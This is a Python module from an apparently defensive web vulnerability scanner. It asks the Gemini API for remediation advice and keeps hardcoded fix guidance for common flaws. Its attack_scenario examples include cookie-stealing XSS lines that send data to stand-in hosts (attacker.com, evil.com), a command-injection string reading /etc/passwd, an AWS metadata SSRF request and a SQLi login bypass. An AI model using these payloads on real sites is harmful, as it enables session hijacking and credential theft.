import os, json, urllib.request, time

GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "")
API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent"

def call_gemini(prompt, retries=2):
    if not GEMINI_API_KEY:
        return None
    for attempt in range(retries):
        try:
            data = json.dumps({
                "contents": [{"parts": [{"text": prompt}]}],
                "generationConfig": {"temperature": 0.2, "maxOutputTokens": 800}
            }).encode("utf-8")
            req = urllib.request.Request(
                f"{API_URL}?key={GEMINI_API_KEY}",
                data=data,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=20) as resp:
                result = json.loads(resp.read().decode("utf-8"))
                return result["candidates"][0]["content"]["parts"][0]["text"]
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(2)
    return None

def analyze_vulnerability(vuln: dict) -> dict:
    """Get AI analysis for ONE vulnerability. Falls back gracefully."""
    prompt = f"""You are a senior web application security expert.
Analyze this vulnerability and respond ONLY with a valid JSON object.
No markdown, no backticks, no extra text — just the JSON.

Vulnerability details:
- Type: {vuln.get('vuln_type', 'Unknown')}
- Severity: {vuln.get('severity', 'Unknown')}
- URL: {vuln.get('url', '')}
- Parameter: {vuln.get('parameter', '')}
- Payload: {vuln.get('payload', 'N/A')}
- Description: {vuln.get('description', '')}

Return this exact JSON structure:
{{
  "risk_explanation": "2-3 sentences explaining WHY this is dangerous in plain English",
  "attack_scenario": "One specific real-world attack example showing how this would be exploited",
  "fix_steps": [
    "Step 1: specific actionable fix",
    "Step 2: specific actionable fix",
    "Step 3: specific actionable fix"
  ],
  "code_example": "one line of secure code example or empty string",
  "cvss_estimate": "numeric score like 9.8",
  "cwe": "CWE-ID like CWE-89"
}}"""

    text = call_gemini(prompt)
    if text:
        try:
            clean = text.strip()
            # Remove markdown code blocks if present
            if clean.startswith("```"):
                clean = clean.split("```")[1]
                if clean.startswith("json"):
                    clean = clean[4:]
            clean = clean.strip()
            return json.loads(clean)
        except:
            pass
    return _fallback(vuln)

def analyze_scan_summary(scan_target: str, vuln_list: list) -> str:
    """Generate executive summary for the entire scan."""
    counts = {"Critical":0,"High":0,"Medium":0,"Low":0}
    for v in vuln_list:
        s = v.get("severity","Low")
        if s in counts: counts[s] += 1

    vuln_lines = "\n".join([
        f"- [{v.get('severity')}] {v.get('vuln_type')} in param '{v.get('parameter')}' at {v.get('url','')[:60]}"
        for v in vuln_list[:20]
    ])

    prompt = f"""You are a senior security consultant writing a professional executive summary.
Target: {scan_target}
Total vulnerabilities: {len(vuln_list)} ({counts['Critical']} Critical, {counts['High']} High, {counts['Medium']} Medium, {counts['Low']} Low)

Key findings:
{vuln_lines}

Write a 3-paragraph executive summary:
Paragraph 1: Overall security posture and most critical findings
Paragraph 2: Business impact and risk if these vulnerabilities are exploited
Paragraph 3: Top 3 immediate priority actions

Keep it professional, concise (under 200 words), no bullet points in summary."""

    result = call_gemini(prompt)
    return result.strip() if result else _fallback_summary(scan_target, vuln_list, counts)

# ── Fallback data ──────────────────────────────────────────────────────────

FALLBACK_DATA = {
    "SQL Injection": {
        "risk_explanation": "SQL Injection allows attackers to manipulate database queries by injecting malicious SQL through user input. This can expose all database records, bypass authentication, modify or delete data, and in some cases execute OS commands on the database server.",
        "attack_scenario": "Attacker enters ' OR '1'='1' -- in the login field, bypassing password verification and gaining access as the first user in the database (often an admin account).",
        "fix_steps": [
            "Use parameterised queries (prepared statements) for ALL database interactions",
            "Never concatenate user input directly into SQL strings",
            "Use an ORM like SQLAlchemy or Django ORM to abstract SQL",
            "Apply principle of least privilege to database accounts",
            "Enable WAF rules to detect and block SQLi patterns"
        ],
        "code_example": "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))",
        "cvss_estimate": "9.8", "cwe": "CWE-89"
    },
    "Cross-Site Scripting (XSS)": {
        "risk_explanation": "XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. This enables session hijacking, credential theft, keylogging, and performing actions on behalf of victims without their knowledge.",
        "attack_scenario": "Attacker posts a comment containing <script>document.location='https://attacker.com/steal?c='+document.cookie</script>, stealing session tokens of every user who views the comment.",
        "fix_steps": [
            "HTML-encode all user-supplied output using htmlspecialchars() or your template engine's auto-escaping",
            "Implement a strict Content-Security-Policy (CSP) header",
            "Set HttpOnly and Secure flags on all session cookies",
            "Validate and sanitise input on both client and server side",
            "Use modern frameworks (React, Angular) that escape by default"
        ],
        "code_example": "{{ user_input | e }}  {# Jinja2 auto-escape #}",
        "cvss_estimate": "7.2", "cwe": "CWE-79"
    },
    "Command Injection": {
        "risk_explanation": "Command injection allows attackers to execute arbitrary OS commands on the server by injecting shell metacharacters into user-supplied input. This gives attackers full control over the server — Remote Code Execution (RCE).",
        "attack_scenario": "Attacker sends '; cat /etc/passwd; whoami in an input field, causing the server to execute the command and return sensitive system information.",
        "fix_steps": [
            "NEVER pass user input to OS commands or shell functions",
            "Use language-native APIs instead of shell commands (os.listdir() not 'ls')",
            "If shell is unavoidable, use subprocess with shell=False and a fixed argument list",
            "Whitelist allowed input characters using strict regex validation",
            "Run the application with minimal OS privileges"
        ],
        "code_example": "subprocess.run(['ls', user_dir], shell=False, capture_output=True)",
        "cvss_estimate": "9.8", "cwe": "CWE-78"
    },
    "CSRF": {
        "risk_explanation": "CSRF tricks authenticated users into unknowingly submitting malicious requests. Attackers can perform any action the victim can perform — changing passwords, making transactions, deleting data — without the victim's knowledge.",
        "attack_scenario": "Attacker emails victim a link to evil.com which contains a hidden form that auto-submits to bank.com/transfer?amount=10000&to=attacker, executing a transfer using the victim's session.",
        "fix_steps": [
            "Add a unique CSRF token to every state-changing form",
            "Validate the CSRF token server-side on every POST/PUT/DELETE request",
            "Set SameSite=Strict or SameSite=Lax on all session cookies",
            "Validate the Origin and Referer headers server-side",
            "Use the Double Submit Cookie pattern as defense-in-depth"
        ],
        "code_example": "<input type='hidden' name='csrf_token' value='{{ csrf_token() }}'>",
        "cvss_estimate": "8.0", "cwe": "CWE-352"
    },
    "SSRF": {
        "risk_explanation": "SSRF allows attackers to make the server perform requests to internal services or metadata endpoints that are not accessible externally. This can expose cloud credentials, internal APIs, and sensitive configuration data.",
        "attack_scenario": "Attacker sends url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ to the server, which fetches and returns AWS IAM credentials, giving full cloud account access.",
        "fix_steps": [
            "Whitelist allowed domains and IP ranges — deny everything else",
            "Block requests to RFC1918 private ranges (10.x, 172.16-31.x, 192.168.x)",
            "Disable unnecessary URL schemes (file://, dict://, gopher://)",
            "Use a DNS allowlist to prevent DNS rebinding attacks",
            "Deploy in network-segmented environment"
        ],
        "code_example": "ALLOWED_HOSTS = {'api.example.com', 'cdn.example.com'}",
        "cvss_estimate": "8.6", "cwe": "CWE-918"
    },
    "LFI": {
        "risk_explanation": "Local File Inclusion allows attackers to read arbitrary files from the server's filesystem, including sensitive configuration files, credentials, private keys, and source code.",
        "attack_scenario": "Attacker requests ?page=../../../../etc/passwd, causing the server to return the system password file revealing all user accounts and potentially crackable password hashes.",
        "fix_steps": [
            "Never use user input to construct file paths",
            "Use a whitelist of allowed filenames/pages (not a blacklist)",
            "Use basename() to strip directory traversal sequences",
            "Set open_basedir in PHP to restrict file access",
            "Run web server with minimal filesystem permissions"
        ],
        "code_example": "ALLOWED_PAGES = {'home', 'about', 'contact'}; page = request.args.get('page') if page in ALLOWED_PAGES else 'home'",
        "cvss_estimate": "7.5", "cwe": "CWE-22"
    },
    "IDOR": {
        "risk_explanation": "IDOR allows attackers to access other users' resources by manipulating object identifiers in requests. Attackers can view, modify, or delete any user's data by simply changing an ID parameter.",
        "attack_scenario": "Logged in as user 1234, attacker changes ?user_id=1234 to ?user_id=1235 and accesses another user's private profile, orders, and payment details.",
        "fix_steps": [
            "Verify server-side that the requesting user owns/has access to the requested resource",
            "Use indirect references (random UUIDs) instead of sequential integers",
            "Implement proper access control at the data layer, not just the UI",
            "Log and alert on unusual access patterns (enumeration attempts)",
            "Apply rate limiting to prevent automated enumeration"
        ],
        "code_example": "if resource.owner_id != current_user.id: abort(403)",
        "cvss_estimate": "8.1", "cwe": "CWE-284"
    },
    "Open Redirect": {
        "risk_explanation": "Open redirects allow attackers to redirect users from a trusted domain to a malicious site. This is commonly used in phishing attacks where the trusted domain URL adds legitimacy to the malicious link.",
        "attack_scenario": "Attacker sends bank.com/login?redirect=https://bank-secure.evil.com — victim trusts the bank.com domain and doesn't notice the redirect to the phishing site.",
        "fix_steps": [
            "Maintain a strict whitelist of allowed redirect destinations",
            "Use relative paths for redirects (never absolute URLs from user input)",
            "Validate URLs after decoding — attackers use URL encoding to bypass filters",
            "Show a redirect warning page before external redirects",
            "Log all redirect attempts for monitoring"
        ],
        "code_example": "ALLOWED_REDIRECTS = {'/dashboard', '/profile', '/home'}",
        "cvss_estimate": "6.1", "cwe": "CWE-601"
    },
    "JWT": {
        "risk_explanation": "JWT vulnerabilities allow attackers to forge authentication tokens, gaining unauthorized access to accounts or escalating privileges. Weak secrets can be brute-forced, and algorithm confusion can bypass signature verification entirely.",
        "attack_scenario": "Attacker changes JWT algorithm to 'none' and modifies the payload to set role:'admin', then sends the unsigned token. Server accepts it without verifying signature.",
        "fix_steps": [
            "Reject JWTs with alg=none — hardcode the algorithm server-side",
            "Use RS256 (asymmetric) instead of HS256 for better security",
            "Use a cryptographically random secret of at least 256 bits",
            "Always set and validate the exp (expiration) claim",
            "Implement token revocation list for logout functionality"
        ],
        "code_example": "jwt.decode(token, SECRET, algorithms=['RS256'])  # explicit algorithm",
        "cvss_estimate": "8.8", "cwe": "CWE-347"
    },
}

# Override at module level — add header-specific fallbacks
HEADER_FALLBACKS = {
    "content-security-policy": {
        "risk_explanation": "Without CSP, browsers execute any script on the page — making XSS attacks trivially easy. Attackers can inject scripts that steal cookies, redirect users, or log keystrokes.",
        "attack_scenario": "Attacker injects <script>fetch('https://evil.com?c='+document.cookie)</script> via XSS — without CSP, browser executes it and sends session cookies to attacker.",
        "fix_steps": [
            "Add header: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'",
            "Remove all inline scripts and event handlers from HTML — move to external .js files",
            "Use nonces or hashes for any required inline scripts",
            "Test CSP with report-only mode first: Content-Security-Policy-Report-Only",
            "Use CSP evaluator tool (csp-evaluator.withgoogle.com) to verify policy strength"
        ],
        "code_example": "response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self'\"",
        "cvss_estimate": "6.1", "cwe": "CWE-693"
    },
    "strict-transport-security": {
        "risk_explanation": "Without HSTS, attackers can perform SSL-stripping attacks — downgrading HTTPS connections to HTTP and intercepting all traffic including passwords and session tokens.",
        "attack_scenario": "Attacker on same WiFi intercepts user's HTTP request to login page, serves fake HTTP version, and captures credentials before user notices no padlock icon.",
        "fix_steps": [
            "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            "Ensure your site works fully over HTTPS before adding HSTS",
            "Start with short max-age (300s) then increase to 31536000 after testing",
            "Submit to HSTS preload list at hstspreload.org for maximum protection",
            "Redirect all HTTP traffic to HTTPS at web server level"
        ],
        "code_example": "response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'",
        "cvss_estimate": "5.9", "cwe": "CWE-319"
    },
    "x-frame-options": {
        "risk_explanation": "Without X-Frame-Options, attackers can embed your site in an invisible iframe and trick users into clicking buttons they cannot see — performing actions on your site unknowingly (Clickjacking).",
        "attack_scenario": "Attacker overlays your bank's transfer button with an invisible iframe on their gaming site. Users click 'Play Game' but actually click 'Confirm Transfer' on your bank site.",
        "fix_steps": [
            "Add header: X-Frame-Options: DENY (prevents all framing)",
            "Or use: X-Frame-Options: SAMEORIGIN (allows framing from same domain only)",
            "For modern browsers, prefer CSP: frame-ancestors 'none' instead",
            "Test that your site does not break any legitimate iframe usage",
            "Apply to all pages, not just the homepage"
        ],
        "code_example": "response.headers['X-Frame-Options'] = 'DENY'",
        "cvss_estimate": "4.3", "cwe": "CWE-1021"
    },
    "x-content-type-options": {
        "risk_explanation": "Without this header, browsers may MIME-sniff responses and execute files as different types than declared — allowing content-type confusion attacks that bypass security controls.",
        "attack_scenario": "Attacker uploads a file named image.jpg containing JavaScript. Without nosniff, browser detects script content and executes it, bypassing the upload restriction.",
        "fix_steps": [
            "Add header: X-Content-Type-Options: nosniff",
            "Ensure all resources are served with correct Content-Type headers",
            "Validate file types server-side — never trust user-supplied MIME types",
            "Apply to all responses including API endpoints",
            "This is a one-line fix with zero side effects"
        ],
        "code_example": "response.headers['X-Content-Type-Options'] = 'nosniff'",
        "cvss_estimate": "3.7", "cwe": "CWE-430"
    },
    "referrer-policy": {
        "risk_explanation": "Without Referrer-Policy, the full URL (including query parameters with sensitive data like search terms, user IDs, or tokens) is sent to third parties via the Referer header.",
        "attack_scenario": "User on https://bank.com/account?token=secret123 clicks an external link. The full URL including token is sent to the external site via Referer header — token exposed.",
        "fix_steps": [
            "Add header: Referrer-Policy: strict-origin-when-cross-origin",
            "For maximum privacy use: Referrer-Policy: no-referrer",
            "Never include sensitive data (tokens, IDs) in URLs",
            "Apply consistently across all pages",
            "Test that analytics and tracking still work after applying policy"
        ],
        "code_example": "response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'",
        "cvss_estimate": "3.7", "cwe": "CWE-116"
    },
    "permissions-policy": {
        "risk_explanation": "Without Permissions-Policy, malicious scripts (via XSS or third-party code) can access powerful browser APIs like camera, microphone, and geolocation without explicit user permission.",
        "attack_scenario": "XSS payload activates microphone via navigator.mediaDevices.getUserMedia() and streams audio to attacker's server — possible because no Permissions-Policy restricts microphone access.",
        "fix_steps": [
            "Add header: Permissions-Policy: camera=(), microphone=(), geolocation=()",
            "Only enable features explicitly needed: Permissions-Policy: camera=(self)",
            "Review all third-party scripts and restrict their feature access",
            "Use Feature-Policy for older browser compatibility",
            "Test that legitimate features still work after applying policy"
        ],
        "code_example": "response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'",
        "cvss_estimate": "3.7", "cwe": "CWE-693"
    },
    "cache-control": {
        "risk_explanation": "Without proper cache headers, browsers and proxies cache sensitive pages. Other users of a shared computer or compromised proxy can access cached authenticated pages and data.",
        "attack_scenario": "User logs into banking app on a public computer. Without no-store, browser caches the account page. Next user presses Back button and sees the previous user's account details.",
        "fix_steps": [
            "Add: Cache-Control: no-store, no-cache, must-revalidate for all authenticated pages",
            "Also add: Pragma: no-cache for HTTP/1.0 compatibility",
            "For static assets (CSS, JS, images) use: Cache-Control: public, max-age=31536000",
            "Never cache pages containing sensitive user data or authentication tokens",
            "Test with browser DevTools to verify cache behavior"
        ],
        "code_example": "response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'",
        "cvss_estimate": "3.7", "cwe": "CWE-524"
    },
    "x-xss-protection": {
        "risk_explanation": "Without X-XSS-Protection, older browsers (IE, older Chrome) do not activate their built-in XSS filter, missing an additional layer of protection against reflected XSS attacks.",
        "attack_scenario": "Reflected XSS in IE browser executes because the browser's built-in XSS filter is not enabled — a header would have blocked it automatically.",
        "fix_steps": [
            "Add header: X-XSS-Protection: 1; mode=block",
            "Note: this is a legacy header — modern browsers use CSP instead",
            "Prioritize implementing Content-Security-Policy for real XSS protection",
            "Apply to all HTML responses",
            "This is a simple one-line addition"
        ],
        "code_example": "response.headers['X-XSS-Protection'] = '1; mode=block'",
        "cvss_estimate": "3.7", "cwe": "CWE-79"
    },
    "insecure cookie": {
        "risk_explanation": "Session cookies without Secure and HttpOnly flags can be stolen via network interception or JavaScript injection. Attackers who steal session cookies gain complete account access without needing the password.",
        "attack_scenario": "User on public WiFi connects to HTTP site — attacker intercepts network traffic and captures session cookie. Attacker replays cookie to impersonate the user.",
        "fix_steps": [
            "Add Secure flag: cookie only sent over HTTPS connections",
            "Add HttpOnly flag: prevents JavaScript from accessing the cookie",
            "Add SameSite=Strict: prevents cookie being sent in cross-site requests",
            "Set appropriate expiry — avoid persistent cookies for sensitive sessions",
            "Regenerate session ID after authentication to prevent session fixation"
        ],
        "code_example": "response.set_cookie('session', value, secure=True, httponly=True, samesite='Strict')",
        "cvss_estimate": "5.9", "cwe": "CWE-614"
    },
    "insecure protocol": {
        "risk_explanation": "HTTP transmits all data in plaintext. Credentials, session tokens, and personal data are visible to anyone monitoring the network.",
        "attack_scenario": "User logs in on coffee shop WiFi over HTTP. Attacker running Wireshark captures the POST request containing username and password in cleartext.",
        "fix_steps": [
            "Obtain and install a TLS certificate (free from Let's Encrypt)",
            "Configure web server to redirect all HTTP port 80 to HTTPS port 443",
            "Enable HTTP Strict Transport Security HSTS header after migration",
            "Update all internal links and resources to use HTTPS URLs",
            "Verify TLS configuration using SSL Labs ssllabs.com/ssltest"
        ],
        "code_example": "# nginx: return 301 https://$server_name$request_uri;",
        "cvss_estimate": "7.4", "cwe": "CWE-319"
    },
    "server version": {
        "risk_explanation": "Exposing server version helps attackers identify known CVEs for that exact version and launch targeted exploits without manual probing.",
        "attack_scenario": "Server reveals Apache/2.4.49 — attacker looks up CVE-2021-41773 path traversal RCE in that version and launches targeted attack immediately.",
        "fix_steps": [
            "Apache: Set ServerTokens Prod and ServerSignature Off in httpd.conf",
            "Nginx: Set server_tokens off in nginx.conf",
            "Remove X-Powered-By header completely",
            "IIS: Remove Server header using URL Rewrite module",
            "Keep all server software updated regardless of version disclosure"
        ],
        "code_example": "# Apache httpd.conf:\nServerTokens Prod\nServerSignature Off",
        "cvss_estimate": "3.7", "cwe": "CWE-200"
    },
    "insecure cookie configuration": {
        "risk_explanation": "Session cookies missing security flags can be intercepted or accessed by malicious scripts, allowing attackers to hijack user sessions.",
        "attack_scenario": "XSS vulnerability reads document.cookie and exfiltrates session token because HttpOnly flag is missing, giving attacker full account access.",
        "fix_steps": [
            "Set HttpOnly flag on all session cookies to prevent JavaScript access",
            "Set Secure flag so cookies only transmit over HTTPS",
            "Set SameSite=Strict to prevent CSRF attacks via cookies",
            "Use short session expiry times for sensitive applications",
            "Invalidate old session tokens after login to prevent fixation"
        ],
        "code_example": "session.cookie_secure = True; session.cookie_httponly = True",
        "cvss_estimate": "5.9", "cwe": "CWE-614"
    },
}

def _get_header_fallback(vuln_type):
    """Get specific fallback for security header findings."""
    vuln_lower = vuln_type.lower()
    for key, data in HEADER_FALLBACKS.items():
        if key in vuln_lower:
            return data
    return None

def _fallback(vuln):
    """Return pre-written analysis when Gemini is unavailable."""
    vuln_type = vuln.get("vuln_type", "")

    # Check header-specific fallbacks first
    header_data = _get_header_fallback(vuln_type)
    if header_data:
        return header_data

    for key, data in FALLBACK_DATA.items():
        if key.lower() in vuln_type.lower():
            return data

    # Generic fallback for headers and other issues
    return {
        "risk_explanation": vuln.get("description", "Security misconfiguration detected that exposes the application to potential attacks."),
        "attack_scenario": "An attacker could exploit this misconfiguration to compromise application security or user data.",
        "fix_steps": [vuln.get("recommendation", "Follow OWASP security best practices and implement proper security controls.")],
        "code_example": "",
        "cvss_estimate": "5.0",
        "cwe": "CWE-16"
    }

def _fallback_summary(target, vulns, counts):
    return f"""Executive Summary — {target}

The security assessment identified {len(vulns)} vulnerabilities across this web application: {counts['Critical']} Critical, {counts['High']} High, {counts['Medium']} Medium, and {counts['Low']} Low severity findings. The overall security posture requires immediate attention.

Critical and High severity findings pose immediate risk to the application and its users. SQL Injection vulnerabilities could allow attackers to access or destroy the entire database. XSS vulnerabilities enable attackers to hijack user sessions and steal credentials. Command injection findings indicate potential for full server compromise.

Recommended immediate actions: (1) Fix all SQL queries to use parameterised statements — this is the highest priority. (2) Implement output encoding for all user-supplied data rendered in HTML pages. (3) Add missing security headers including Content-Security-Policy and HSTS to harden the application against common attacks."""
